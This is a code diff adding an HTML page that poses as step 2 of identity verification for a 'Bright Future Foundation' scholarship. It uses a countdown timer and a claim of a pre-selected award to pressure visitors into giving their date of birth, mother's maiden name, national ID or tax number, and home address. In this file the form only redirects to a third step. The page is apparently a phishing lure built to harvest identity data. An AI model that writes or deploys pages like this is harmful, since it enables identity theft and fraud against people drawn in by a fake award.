@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">
+<title>Bright Future Scholarship Identity Verification</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
+  body { background:#eef1f8; color:#1a1a1a; min-height:100vh; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="brand">Bright Future Foundation</div>
+</div>
+<div class="urgency-strip">⚠ Your pre-selected award expires in 11:11:11 complete all steps to secure funding</div>
+
+<div class="wrap">
+  <div class="progress">
+    <div class="active"></div><div class="active"></div><div></div><div></div>
+  </div>
+
+  <div class="card">
+    <h1>Step 2 of 4 Identity Verification</h1>
+    <p class="sub">To prevent fraud and confirm your award, we need to verify your identity.</p>
+    <div class="warn-box">⚠ This information must match your government ID exactly or your application may be delayed.</div>
+
+    <form id="f2" autocomplete="off">
+      <label for="dob">Date of birth</label>
+      <input type="date" id="dob" required>
+
+      <label for="maiden">Mother's maiden name</label>
+      <input type="text" id="maiden" placeholder="For identity confirmation" required>
+
+      <label for="natid">National ID / SSS / TIN number</label>
+      <input type="text" id="natid" placeholder="XXX-XXX-XXX-XXX" required>
+
+      <label for="address">Home address</label>
+      <input type="text" id="address" placeholder="House No., Street, City" required>
+
+      <button type="submit" class="next-btn">Verify & Continue →</button>
+    </form>
+
+    
+  </div>
+</div>
+
+<script>
+  document.getElementById('f2').addEventListener('submit', function(e){
+    e.preventDefault();
+    window.location.href = 'apply_step3.html';
+  });
+</script>
+
+</body>
+</html>
